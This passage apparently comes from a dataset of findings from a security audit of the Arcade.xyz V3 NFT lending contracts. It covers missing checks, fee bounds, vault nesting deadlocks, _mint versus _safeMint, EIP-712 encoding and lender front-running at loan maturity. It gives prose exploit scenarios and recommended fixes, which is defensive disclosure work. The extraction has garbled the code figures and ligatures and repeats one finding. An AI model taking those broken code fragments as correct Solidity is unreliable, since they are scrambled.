URI returned by the tokenURI() function will be incorrect, but this error will not be detected due to the missing return value check on _exists(). 165 function tokenURI(uint256 tokenId) public view override(INFTWithDescriptor, ERC721) returns (string memory) { 166 167 168 169 } _exists(tokenId); return descriptor.tokenURI(address(this), tokenId); Figure 5.1: The tokenURI function in arcade-protocol/contracts/PromissoryNote.sol 48 function tokenURI(address, uint256 tokenId) external view override returns (string memory) { 49 return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : \"\"; 50 } Figure 5.2: The tokenURI function in arcade-protocol/contracts/nft/BaseURIDescriptor.sol Exploit Scenario Bob, a developer of a front-end blockchain application that interacts with the Arcade contracts, develops a page that lists users' promissory notes and vaults with their respective URIs. He accidentally passes a nonexistent tokenId to tokenURI(), causing his application to show an incorrect or incomplete URI. 31 Arcade.xyz V3 Security Assessment Recommendations Short term, add a check for the _exists() functions return value to both of the tokenURI() functions to prevent them from returning an incomplete URI for nonexistent tokens. Long term, add new test cases to verify the expected return values of tokenURI() in all contracts that use it, with valid and invalid tokens as arguments. 32 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Incorrect deployers in integration tests ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "The xture deployment function in the provided integration tests uses dierent signers for deploying the Arcade contracts before performing the tests. All Arcade contracts are meant to be deployed by the protocol team, except for vaults, which are deployed by users using the VaultFactory contract. However, in the xture deployment function, some contracts are deployed from the borrower account instead of the admin account. Some examples are shown in gure 6.1; however, there are other instances in which contracts are not deployed from the admin account. const whitelist = <CallWhitelist>await deploy(\"CallWhitelist\", signers[0], const signers: SignerWithAddress[] = await ethers.getSigners(); const [borrower, lender, admin] = signers; 71 72 73 74 []); 75 76 77 signers[0], [BASE_URI]) 78 [vaultTemplate.address, whitelist.address, feeController.address, descriptor.address]); const vaultTemplate = <AssetVault>await deploy(\"AssetVault\", signers[0], []); const feeController = <FeeController>await deploy(\"FeeController\", admin, []); const descriptor = <BaseURIDescriptor>await deploy(\"BaseURIDescriptor\", const vaultFactory = <VaultFactory>await deploy(\"VaultFactory\", signers[0], Figure 6.1: A snippet of the tests in arcade-protocol/test/Integration.ts Exploit Scenario Alice, a developer on the Arcade team, adds a new permissioned feature to the protocol. She adds the relevant integration tests for her feature, and all tests pass. However, because the deployer for the test contracts was not the admin account, those tests should have failed, and the contracts are deployed to the network with a bug. Recommendations Short term, correct all of the instances of incorrect deployers for the contracts in the integration tests le. 33 Arcade.xyz V3 Security Assessment Long term, add additional test cases to ensure that the account permissions in all deployed contracts are correct. 34 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Risk of out-of-gas revert due to use of transfer() in claimFees ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "The VaultFactory.claimFees function uses the low-level transfer() operation to move the collected ETH fees to another arbitrary address. The transfer() operation sends only 2,300 units of gas with this operation. As a result, if the recipient is a contract with logic inside the receive() function, which would use extra gas, the operation will probably (depending on the gas cost) fail due to an out-of-gas revert. 194 195 196 197 198 199 function claimFees(address to) external onlyRole(FEE_CLAIMER_ROLE) { uint256 balance = address(this).balance; payable(to).transfer(balance); emit ClaimFees(to, balance); } Figure 7.1: The claimFees function in arcade-protocol/contracts/vault/VaultFactory.sol The Arcade team has explained that the recipient will be a treasury contract with no logic inside the receive() function, meaning the current use of transfer() will not pose any problems. However, if at some point the recipient does contain logic inside the receive() function, then claimFees will likely revert and the contract will not be able to claim the funds. Note, however, that the fees could be claimed by another address (i.e., the fees will not be stuck). The withdrawETH function in the AssetVault contract uses Address.sendValue instead of transfer(). function withdrawETH(address to) external override onlyOwner 223 onlyWithdrawEnabled nonReentrant { 224 225 226 227 228 // perform transfer uint256 balance = address(this).balance; payable(to).sendValue(balance); emit WithdrawETH(msg.sender, to, balance); } 35 Arcade.xyz V3 Security Assessment Figure 7.2: The withdrawETH function in arcade-protocol/contracts/vault/AssetVault.sol Address.sendValue internally uses the call() operation, passing along all of the remaining gas, so this function could be a good candidate to replace use of transfer() in claimFees. However, doing so could introduce other risks like reentrancy attacks. Note that neither the withdrawETH function nor the claimFees function is currently at risk of reentrancy attacks. Exploit Scenario Alice, a developer on the Arcade team, deploys a new treasury contract that contains an updated receive() function that also writes the received ETH amount into a storage array in the treasury contract. Bob, whose account has the FEE_CLAIMER_ROLE role in the VaultFactory contract, calls claimFees with the newly deployed treasury contract as the recipient. The transaction fails because the write to storage exceeds the passed along 2,300 units of gas. Recommendations Short term, consider replacing the claimFees functions use of transfer() with Address.sendValue; weigh the risk of possibly introducing vulnerabilities like reentrancy attacks against the benet of being able to one day add logic in the fee recipients receive() function. If the decision is to have claimFees continue to use transfer(), update the NatSpec comments for the function so that readers will be aware of the 2,300 gas limit on the fee recipient. Long term, when deciding between using the low-level transfer() and call() operations, consider how malicious smart contracts may be able to exploit the lack of limits on the gas available in the recipient function. Additionally, consider the likelihood that the recipient will be a smart wallet or multisig (or other smart contract) with logic inside the receive() function, as the 2,300 gas from transfer() might not be sucient for those recipients. 36 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "8. Risk of lost funds due to lack of zero-address check in functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "The VaultFactory.claimFees (gure 8.1), RepaymentController.redeemNote (gure 8.2), LoanCore.withdraw, and LoanCore.withdrawProtocolFees functions are all missing a check to ensure that the to argument does not equal the zero address. As a result, these functions could transfer funds to the zero address. 194 195 196 197 198 199 function claimFees(address to) external onlyRole(FEE_CLAIMER_ROLE) { uint256 balance = address(this).balance; payable(to).transfer(balance); emit ClaimFees(to, balance); } Figure 8.1: The claimFees function in arcade-protocol/contracts/vault/VaultFactory.sol function redeemNote(uint256 loanId, address to) external override { LoanLibrary.LoanData memory data = loanCore.getLoan(loanId); (, uint256 amountOwed) = loanCore.getNoteReceipt(loanId); if (data.state != LoanLibrary.LoanState.Repaid) revert address lender = lenderNote.ownerOf(loanId); if (lender != msg.sender) revert RC_OnlyLender(lender, msg.sender); uint256 redeemFee = (amountOwed * feeController.get(FL_09)) / 126 127 128 129 130 RC_InvalidState(data.state); 131 132 133 134 BASIS_POINTS_DENOMINATOR; 135 136 137 } loanCore.redeemNote(loanId, redeemFee, to); Figure 8.2: The redeemNote function in arcade-protocol/contracts/RepaymentController.sol Exploit Scenario A script that is used to periodically withdraw the protocol fees (calling LoanCore.withdrawProtocolFees) is updated. Due to a mistake, the to argument is left 37 Arcade.xyz V3 Security Assessment uninitialized. The script is executed, and the to argument defaults to the zero address, causing withdrawProtocolFees to transfer the protocol fees to the zero address. Recommendations Short term, add a check to verify that to does not equal the zero address to the following functions:  VaultFactory.claimFees  RepaymentController.redeemNote  LoanCore.withdraw  LoanCore.withdrawProtocolFees Long term, use the Slither static analyzer to catch common issues such as this one. Consider integrating a Slither scan into the projects CI pipeline, pre-commit hooks, or build scripts. 38 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "9. The maximum value for FL_09 is not set by FeeController ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "The FeeController constructor initializes all of the maximum values for the fees dened in the FeeLookups contract except for FL_09 (LENDER_REDEEM_FEE). Because the maximum value is not set, it is possible to set any amount, with no upper bound, for that particular fee. The lender's redeem fee is used in RepaymentControllers redeemNote function to calculate the fee paid by the lender to the protocol in order to receive their funds back. If the protocol team accidentally sets the fee to 100%, all of the users' funds to be redeemed would instead be used to pay the protocol. 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 constructor() { /// @dev Vault mint fee - gross maxFees[FL_01] = 1 ether; /// @dev Origination fees - bps maxFees[FL_02] = 10_00; maxFees[FL_03] = 10_00; /// @dev Rollover fees - bps maxFees[FL_04] = 20_00; maxFees[FL_05] = 20_00; /// @dev Loan closure fees - bps maxFees[FL_06] = 10_00; maxFees[FL_07] = 50_00; maxFees[FL_08] = 10_00; } Figure 9.1: The constructor in arcade-protocol/contracts/FeeController.sol function redeemNote(uint256 loanId, address to) external override { LoanLibrary.LoanData memory data = loanCore.getLoan(loanId); (, uint256 amountOwed) = loanCore.getNoteReceipt(loanId); 126 127 128 129 130 RC_InvalidState(data.state); 131 if (data.state != LoanLibrary.LoanState.Repaid) revert address lender = lenderNote.ownerOf(loanId); 39 Arcade.xyz V3 Security Assessment if (lender != msg.sender) revert RC_OnlyLender(lender, msg.sender); uint256 redeemFee = (amountOwed * feeController.get(FL_09)) / 132 133 134 BASIS_POINTS_DENOMINATOR; 135 136 137 } loanCore.redeemNote(loanId, redeemFee, to); Figure 9.2: The redeemNote function in arcade-protocol/contracts/RepaymentController.sol Exploit Scenario Charlie, a member of the Arcade protocol team, has access to the privileged account that can change the protocol fees. He wants to set LENDERS_REDEEM_FEE to 5%, but he accidentally types a 0 and sets it to 50%. Users can now lose half of their funds to the new protocol fee, causing distress and lack of trust in the team. Recommendations Short term, set a maximum boundary for the FL_09 fee in FeeControllers constructor. Long term, improve the test suite to ensure that all fee-changing functions test for out-of-bounds values for all fees, not just FL_02. 40 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "10. Fees can be changed while a loan is active ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "All fees in the protocol are calculated using the current fees, as informed by the FeeController contract. However, fees can be changed by the team at any time, so the eective rollover and closure fees that the users will pay can change once their loans are already initialized; therefore, these fees are impossible to know in advance. For example, in the code shown in gure 10.1, the LENDER_INTEREST_FEE and LENDER_PRINCIPAL_FEE values are read when a loan is about to be repaid, but these values can be dierent from the values the user agreed to when the loan was initialized. The same can happen in OriginationController and other functions in RepaymentController. function _prepareRepay(uint256 loanId) internal view returns (uint256 LoanLibrary.LoanData memory data = loanCore.getLoan(loanId); if (data.state == LoanLibrary.LoanState.DUMMY_DO_NOT_USE) revert if (data.state != LoanLibrary.LoanState.Active) revert 149 amountFromBorrower, uint256 amountToLender) { 150 151 RC_CannotDereference(loanId); 152 RC_InvalidState(data.state); 153 154 155 156 terms.proratedInterestRate); 157 158 BASIS_POINTS_DENOMINATOR; 159 BASIS_POINTS_DENOMINATOR; 160 161 162 163 } LoanLibrary.LoanTerms memory terms = data.terms; uint256 interest = getInterestAmount(terms.principal, uint256 interestFee = (interest * feeController.get(FL_07)) / uint256 principalFee = (terms.principal * feeController.get(FL_08)) / amountFromBorrower = terms.principal + interest; amountToLender = amountFromBorrower - interestFee - principalFee; Figure 10.1: The _prepareRepay function in arcade-protocol/contracts/RepaymentController.sol 41 Arcade.xyz V3 Security Assessment Exploit Scenario Lucy, the lender, and Bob, the borrower, agree on the current loan conditions and fees at a certain point in time. Some weeks later, when the time comes to repay the loan, they learn that the protocol team decided to change the fees while their loan was active. Lucys earnings are now dierent from what she expected. Recommendations Short term, consider storing (for example, in the LoanTerms structure) the fee values that both counterparties agree on when a loan is initialized, and use those local values for the full lifetime of the loan. Long term, document all of the conditions that are agreed on by the counterparties and that should be constant during the lifetime of the loan, and make sure they are preserved. Add a specic integration or fuzzing test for these conditions. 42 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "11. Asset vault nesting can lead to loss of assets ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "Allowing asset vaults to be nested (e.g., vault A is owned by vault B, and vault B is owned by vault X, etc.) could result in a situation in which multiple asset vaults own each other. This would result in a deadlock preventing assets in the aected asset vaults from ever being withdrawn again. Asset vaults are designed to hold dierent types of assets, including ERC-721 tokens. The ownership of an asset vault is tracked by an accompanying ERC-721 token that is minted (gure 11.1) when the asset vault is deployed through the VaultFactory contract. 164 (uint256) { 165 166 167 mintFee); 168 169 170 171 172 173 mintFee); 174 175 176 177 } function initializeBundle(address to) external payable override returns uint256 mintFee = feeController.get(FL_01); if (msg.value < mintFee) revert VF_InsufficientMintFee(msg.value, address vault = _create(); _mint(to, uint256(uint160(vault))); emit VaultCreated(vault, to); return uint256(uint160(vault)); if (msg.value > mintFee) payable(msg.sender).transfer(msg.value - Figure 11.1: The initializeBundle function in arcade-protocol/contracts/vault/VaultFactory.sol To add an ERC-721 asset to an asset vault, it needs to be transferred to the asset vaults address. Because the ownership of an asset vault is tracked by an ERC-721 token, it is possible to transfer the ownership of an asset vault to another asset vault by simply transferring the ERC-721 token representing vault ownership. To withdraw ERC-721 tokens from an asset vault, the owner (the holder of the asset vaults ERC-721 token) needs to 43 Arcade.xyz V3 Security Assessment enable withdrawals (using the enableWithdraw function) and then call the withdrawERC721 (or withdrawBatch) function. 121 122 123 124 150 151 152 153 154 155 156 function enableWithdraw() external override onlyOwner onlyWithdrawDisabled { withdrawEnabled = true; emit WithdrawEnabled(msg.sender); } Figure 11.2: The enableWithdraw function in arcade-protocol/contracts/vault/AssetVault.sol function withdrawERC721( address token, uint256 tokenId, address to ) external override onlyOwner onlyWithdrawEnabled { _withdrawERC721(token, tokenId, to); } Figure 11.3: The withdrawERC721 function in arcade-protocol/contracts/vault/AssetVault.sol Only the owner of an asset vault can enable and perform withdrawals. Therefore, if two (or more) vaults own each other, it would be impossible for a user to enable or perform withdrawals on the aected vaults, permanently locking all assets (ERC-721, ERC-1155, ERC-20, ETH) within them. The severity of the issue depends on the UI, which was out of scope for this review. If the UI does not prevent vaults from owning each other, the severity of this issue is higher. In terms of likelihood, this issue would require a user to make a mistake (although a mistake that is far more likely than the transfer of tokens to a random address) and would require the UI to fail to detect and prevent or warn the user from making such a mistake. We therefore rated the diculty of this issue as high. Exploit Scenario Alice decides to borrow USDC by putting up some of her NFTs as collateral: 1. Alice uses the UI to create an asset vault (vault A) and transfers ve of her CryptoPunks to the asset vault. 2. The UI shows that Alice has another existing vault (vault X), which contains two Bored Apes. She wants to use these two vaults together to borrow a higher amount of USDC. She clicks on vault A and selects the Add Asset option. 3. The UI shows a list of assets that Alice owns, including the ERC-721 token that represents ownership of vault X. Alice clicks on Add, the transaction succeeds, and the vault X NFT is transferred to vault A. Vault X is now owned by vault A. 44 Arcade.xyz V3 Security Assessment 4. Alice decides to add another Bored Ape NFT that she owns to vault X. She opens the vault X page and clicks on Add Assets, and the list of assets that she can add shows the ERC-721 token that represents ownership of vault A. 5. Alice is confused and wonders if adding vault X to vault A worked (step 3). She decides to add vault A to vault X instead. The transaction succeeds, and now vault A owns vault X and vice versa. Alice is now unable to withdraw any of the assets from either vault. Recommendations Short term, take one of the following actions:  Disallow the nesting of asset vaults. That is, prevent users from being able to transfer ownership of an asset vault to another asset vault. This would prevent the issue altogether.  If allowing asset vaults to be nested is a desired feature, update the UI to prevent two or more asset vaults from owning each other (if it does not already do so). Also, update the documentation so that other integrating smart contract protocols are aware of the issue. Long term, when dealing with the nesting of assets, consider edge cases and write extensive tests that ensure these edge cases are handled correctly and that users do not lose access to their assets. Other than unit tests, we recommend writing invariants and testing them using property-based testing with Echidna. 45 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "12. Risk of locked assets due to use of _mint instead of _safeMint ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "The asset vault and promissory note ERC-721 tokens are minted via the _mint function rather than the _safeMint function. The _safeMint function includes a necessary safety check that validates a recipient contracts ability to receive and handle ERC-721 tokens. Without this safeguard, tokens can inadvertently be sent to an incompatible contract, causing them, and any assets they hold, to become irretrievable. 164 (uint256) { 165 166 167 mintFee); 168 169 170 171 172 173 mintFee); 174 175 176 177 } function initializeBundle(address to) external payable override returns uint256 mintFee = feeController.get(FL_01); if (msg.value < mintFee) revert VF_InsufficientMintFee(msg.value, address vault = _create(); _mint(to, uint256(uint160(vault))); emit VaultCreated(vault, to); return uint256(uint160(vault)); if (msg.value > mintFee) payable(msg.sender).transfer(msg.value - Figure 12.1: The initializeBundle function in arcade-protocol/contracts/vault/VaultFactory.sol function mint(address to, uint256 loanId) external override returns (uint256) if (!hasRole(MINT_BURN_ROLE, msg.sender)) revert 135 { 136 PN_MintingRole(msg.sender); 137 138 139 140 return loanId; _mint(to, loanId); } Figure 12.2: The mint function in arcade-protocol/contracts/PromissoryNote.sol 46 Arcade.xyz V3 Security Assessment The _safeMint functions built-in safety check ensures that the recipient contract has the necessary ERC721Receiver implementation, verifying the contracts ability to receive and manage ERC-721 tokens. 258 259 260 261 262 263 264 265 266 267 268 function _safeMint( address to, uint256 tokenId, bytes memory _data ) internal virtual { _mint(to, tokenId); require( _checkOnERC721Received(address(0), to, tokenId, _data), \"ERC721: transfer to non ERC721Receiver implementer\" ); } Figure 12.3: The _safeMint function in openzeppelin-contracts/contracts/token/ERC721/ERC721.sol The _checkOnERC721Received method invokes the onERC721Received method on the receiving contract, expecting a return value containing the bytes4 selector of the onERC721Received method. A successful pass of this check implies that the contract is indeed capable of receiving and processing ERC-721 tokens. The _safeMint function does allow for reentrancy through the calling of _checkOnERC721Received on the receiver of the token. However, based on the order of operations in the aected functions in Arcade (gures 12.1 and 12.2), this poses no risk. Exploit Scenario Alice initializes a new asset vault by invoking the initializeBundle function of the VaultFactory contract, passing in her smart contract wallet address as the to argument. She transfers her valuable CryptoPunks NFT, intended to be used for collateral, to the newly created asset vault. However, she later discovers that her smart contract wallet lacks support for ERC-721 tokens. As a result, both her asset vault token and the CryptoPunks NFT become irretrievable, stuck within her smart wallet contract due to the absence of a mechanism to handle ERC-721 tokens. Recommendations Short term, use the _safeMint function instead of _mint in the PromissoryNote and VaultFactory contracts. The _safeMint function includes vital checks that ensure the recipient is equipped to handle ERC-721 tokens, thus mitigating the risk that NFTs could become frozen. Long term, enhance the unit testing suite. These tests should encompass more negative paths and potential edge cases, which will help uncover any hidden vulnerabilities or bugs like this one. Additionally, it is critical to test user-provided inputs extensively, covering a 47 Arcade.xyz V3 Security Assessment broad spectrum of potential scenarios. This rigorous testing will contribute to building a more secure, robust, and reliable system. 48 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "13. Borrowers cannot realize full loan value without risking default ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "To fully capitalize on their loans, borrowers need to retain their loaned assets and the owed interest for the entire term of their loans. However, if a borrower waits until the loans maturity date to repay it, they become immediately vulnerable to liquidation of their collateral by the lender. As soon as the block.timestamp value exceeds the dueDate value, a lender can invoke the claim function to liquidate the borrowers collateral. 293 294 295 // First check if the call is being made after the due date. uint256 dueDate = data.startDate + data.terms.durationSecs; if (dueDate >= block.timestamp) revert LC_NotExpired(dueDate); Figure 13.1: A snippet of the claim function in arcade-protocol/contracts/LoanCore.sol Owing to the inherent nature of the blockchain, achieving precise synchronization between the block.timestamp and the dueDate is practically impossible. Moreover, repaying a loan before the dueDate would result in a loss of some of the loans inherent value because the protocols interest assessment design does not refund any part of the interest for early repayment. In a scenario in which block.timestamp is greater than dueDate, a lender can preempt a borrowers loan repayment attempt, invoke the claim function, and liquidate the borrowers collateral. Frequently, collateral will be worth more than the loaned assets, giving lenders an incentive to do this. Given the protocols interest assessment design, the Arcade team should implement a grace period following the maturity date where no additional interest is expected to be assessed beyond the period agreed to in the loan terms. This buer would give the borrower an opportunity to fully capitalize on the term of their loan without the risk of defaulting and losing their collateral. 49 Arcade.xyz V3 Security Assessment Exploit Scenario Alice, a borrower, takes out a loan from Eve using Arcades NFT lending protocol. Alice deposits her rare CryptoPunk as collateral, which is more valuable than the assets loaned to her, so that her position is over-collateralized. Alice plans to hold on to the lent assets for the entire duration of the loan period in order to maximize her benet-to-cost ratio. Eve, the lender, is monitoring the blockchain for the moment when the block.timestamp is greater than or equal to the dueDate so that she can call the claim function and liquidate Alices CryptoPunk. As soon as the loan term is up, Alice submits a transaction to the repay function, and Eve front-runs that transaction with her own call to the claim function. As a result, Eve is able to liquidate Alices CryptoPunk collateral. Recommendations Short term, introduce a grace period after the loan's maturity date during which the lender cannot invoke the claim function. This buer would give the borrower sucient time to repay the loan without the risk of immediate collateral liquidation. Long term, revise the protocol's interest assessment design to allow a portion of the interest to be refunded in cases of early repayment. This change could reduce the incentive for borrowers to delay repayment until the last possible moment. Additionally, provide better education for borrowers on how the lending protocol works, particularly around critical dates and actions, and improve communication channels for borrowers to raise concerns or seek clarication. 50 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "14. itemPredicates encoded incorrectly according to EIP-712 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "The itemPredicates parameter is not encoded correctly, so the signer cannot see the verier address when signing. The verier address receives each batch of listed assets to check them for correctness and existence, which is vital to ensuring the security and integrity of the lending transaction. According to EIP-712, structured data should be hashed in conjunction with its typeHash. The following is the hashStruct function as dened in EIP-712: hashStruct(s : ) = keccak256(typeHash  encodeData(s)) where typeHash = keccak256(encodeType(typeOf(s))) In the protocol, the recoverItemsSignature function hashes an array of Predicate[] structs that are passed in as the itemPredicates argument. The function encodes and hashes the array without adding the Predicate typeHash to each member of the array. The hashed output of that operation is then included in the _ITEMS_TYPEHASH variable as a bytes32 type, referred to as itemsHash. 208 209 210 211 212 213 214 (bytes32 sighash, address externalSigner) = recoverItemsSignature( loanTerms, sig, nonce, neededSide, keccak256(abi.encode(itemPredicates)) ); Figure 14.1: A snippet of the initializeLoanWithItems function in arcade-protocol/contracts/OriginationController.sol keccak256( bytes32 private constant _ITEMS_TYPEHASH = 85 86 87 88 proratedInterestRate,uint256 principal,address collateralAddress,bytes32 itemsHash,address payableCurrency,bytes32 affiliateCode,uint160 nonce,uint8 side)\" 89 // solhint-disable max-line-length \"LoanTermsWithItems(uint32 durationSecs,uint32 deadline,uint160 ); 51 Arcade.xyz V3 Security Assessment Figure 14.2: The _ITEMS_TYPEHASH variable in arcade-protocol/contracts/OriginationController.sol However, this method of encoding an array of structs is not consistent with the EIP-712 guidelines, which stipulates the following: The array values are encoded as the keccak256 hash of the concatenated encodeData of their contents (i.e., the encoding of SomeType[5] is identical to that of a struct containing ve members of type SomeType). The struct values are encoded recursively as hashStruct(value). This is undened for cyclical data. Therefore, the protocol should iterate over the itemPredicates array, encoding each Predicate instance separately with its respective typeHash. Exploit Scenario Alice creates a loan oering that takes CryptoPunks as collateral. She submits the loan terms to the Arcade protocol. Bob, a CryptoPunk holder, navigates the Arcade UI to accept Alices loan terms. An EIP-712 signature request appears in MetaMask for Bob to sign. Bob cannot validate whether the message he is signing uses the CryptoPunk verier contract because that information is not included in the hash. Recommendations Short term, adjust the encoding of itemPredicates to comply with EIP-712 standards. Have the code iterate through the itemPredicates array and encode each Predicate instance separately with its associated typeHash. Additionally, refactor the _ITEMS_TYPEHASH variable so that the Predicate typeHash denition is appended to it and replace the bytes32 itemsHash parameter with Predicate[] items. This revision will allow the signer to see the verier address of the message they are signing, ensuring the validity of each batch of items, in addition to complying with the EIP-712 standard. Long term, strictly adhere to established Ethereum protocols such as EIP-712. These standards exist to ensure interoperability, security, and predictable behavior in the Ethereum ecosystem. Violating these norms can lead to unforeseen security vulnerabilities. 52 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "15. The fee values can distort the incentives for the borrowers and lenders ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "Arcade V3 contains nine fee settings. Six of these fees are to be paid by the lender, two are to be paid by the borrower, and the remaining fee is to be paid by the borrower if they decide to mint a new vault for their collateral. Depending on the values of these settings, the incentives can change for both loan counterparties. For example, to create a new loan, both the borrower and lender have to pay origination fees, and eventually, the loan must be rolled over, repaid, or defaulted. In the rst case, both the new lender and borrower pay rollover fees; note that the original lender pays no fees at all for closing the loan. In the second case, the lender pays interest fees and principal fees on closing the loan. Finally, if the loan is defaulted, the lender pays a default fee to liquidate the collateral. The various fees paid based on the outcome of the loan can result in an interesting incentive game for investors in the protocol, depending on the actual values of the fee settings. If the lender rollover fee is cheaper than the origination fee, investors may be incentivized to roll over existing loans instead of creating new ones, beneting the original lenders by saving them the closing fees, and harming the borrowers by indirectly raising the interest rates to compensate. Similarly, if the lender rollover fees are higher than the closing fees, lenders will be less incentivized to rollover loans. In summary, having such ne control over possible fee settings introduces hard-to-predict incentives scenarios that can scare users away or cause users who do not account for fees to inadvertently lose prots. Recommendations Short term, clearly inform borrowers and lenders of all of the existing fees and their current values at the moment a loan is opened, as well as the various possible outcomes, including the expected net prots if the loan is repaid, rolled over, defaulted, or redeemed. Long term, add interactive ways for users to calculate their expected prots, such as a loan simulator. 53 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Di\u0000erent zero-address errors thrown by single and batch NFT withdrawal functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "The withdrawBatch function throws an error that is dierent from the single NFT withdrawal functions (withdrawERC721, withdrawERC1155). This could confuse users and other applications that interact with the Arcade contracts. The withdrawBatch function throws a custom error (AV_ZeroAddress) if the to parameter is set to the zero address. The single NFT withdrawal functions withdrawERC721 and withdrawERC1155 do not explicitly check the to parameter. All three of these functions internally call the _withdrawERC721 and _withdrawERC1155 functions, which also do not explicitly check the to parameter. The lack of such a check is not a problem: according to the ERC-721 and ERC-1155 standards, a transfer must revert if to is the zero address, so the single NFT withdrawal functions will revert on this condition. However, they will revert with the error message that is dened inside the actual NFT contract instead of the Arcade AV_ZeroAddress error, which is thrown when withdrawBatch reverts. ) external override onlyOwner onlyWithdrawEnabled { uint256 tokensLength = tokens.length; if (tokensLength > MAX_WITHDRAW_ITEMS) revert address[] calldata tokens, uint256[] calldata tokenIds, TokenType[] calldata tokenTypes, address to function withdrawBatch( 193 194 195 196 197 198 199 200 AV_TooManyItems(tokensLength); 201 202 AV_LengthMismatch(\"tokenType\"); 203 204 205 206 if (to == address(0)) revert AV_ZeroAddress(); for (uint256 i = 0; i < tokensLength; i++) { if (tokens[i] == address(0)) revert AV_ZeroAddress(); if (tokensLength != tokenIds.length) revert AV_LengthMismatch(\"tokenId\"); if (tokensLength != tokenTypes.length) revert 22 Arcade.xyz V3 Security Assessment Figure 1.1: A snippet of the withdrawBatch function in arcade-protocol/contracts/vault/AssetVault.sol Additionally, the CryptoPunks NFT contract does not follow the ERC-721 and ERC-1155 standards and contains no check that prevents funds from being transferred to the zero address (and the function is called transferPunk instead of the standard transfer). An explicit check to ensure that to is not the zero address inside the withdrawPunk function is therefore recommended. 114 115 116 117 118 119 120 121 122 123 124 125 126 it. 127 128 129 130 131 132 133 134 function transferPunk(address to, uint punkIndex) { if (!allPunksAssigned) throw; if (punkIndexToAddress[punkIndex] != msg.sender) throw; if (punkIndex >= 10000) throw; if (punksOfferedForSale[punkIndex].isForSale) { punkNoLongerForSale(punkIndex); } punkIndexToAddress[punkIndex] = to; balanceOf[msg.sender]--; balanceOf[to]++; Transfer(msg.sender, to, 1); PunkTransfer(msg.sender, to, punkIndex); // Check for the case where there is a bid from the new owner and refund // Any other bid can stay in place. Bid bid = punkBids[punkIndex]; if (bid.bidder == to) { // Kill bid and refund value pendingWithdrawals[to] += bid.value; punkBids[punkIndex] = Bid(false, punkIndex, 0x0, 0); } } Figure 1.2: The transferPunk function in CryptoPunksMarket contract (Etherscan) Lastly, there is no string argument to the AV_ZeroAddress error to indicate which variable equaled the zero address and caused the revert, unlike the AV_LengthMismatch error. For example, in the batch function (gure 1.1), the AV_ZeroAddress could be thrown in line 203 or 206. Exploit Scenario Bob, a developer of a front-end blockchain application that interacts with the Arcade contracts, develops a page that interacts with an AssetVault contract. In his implementation, he catches specic errors that are thrown so that he can show an informative message to the user. Because the batch and withdrawal functions throw dierent errors when to is the zero address, he needs to write two versions of error handlers instead of just one. 23 Arcade.xyz V3 Security Assessment Recommendations Short term, add the zero address check with the custom error to the _withdrawERC721 and _withdrawERC1155 functions. This will cause the same custom error to be thrown for all of the single and batch NFT withdrawal functions. Also, add an explicit zero-address check inside the withdrawPunk function. Lastly, add a string argument to the AV_ZeroAddress custom error that is used to indicate the name of the variable that triggered the error (similar to the one in AV_LengthMismatch). Long term, ensure consistency in the errors thrown throughout the implementation. This will allow users and developers to understand errors that are thrown and will allow the Arcade team to test fewer errors. 24 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "11. Asset vault nesting can lead to loss of assets ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "Allowing asset vaults to be nested (e.g., vault A is owned by vault B, and vault B is owned by vault X, etc.) could result in a situation in which multiple asset vaults own each other. This would result in a deadlock preventing assets in the aected asset vaults from ever being withdrawn again. Asset vaults are designed to hold dierent types of assets, including ERC-721 tokens. The ownership of an asset vault is tracked by an accompanying ERC-721 token that is minted (gure 11.1) when the asset vault is deployed through the VaultFactory contract. 164 (uint256) { 165 166 167 mintFee); 168 169 170 171 172 173 mintFee); 174 175 176 177 } function initializeBundle(address to) external payable override returns uint256 mintFee = feeController.get(FL_01); if (msg.value < mintFee) revert VF_InsufficientMintFee(msg.value, address vault = _create(); _mint(to, uint256(uint160(vault))); emit VaultCreated(vault, to); return uint256(uint160(vault)); if (msg.value > mintFee) 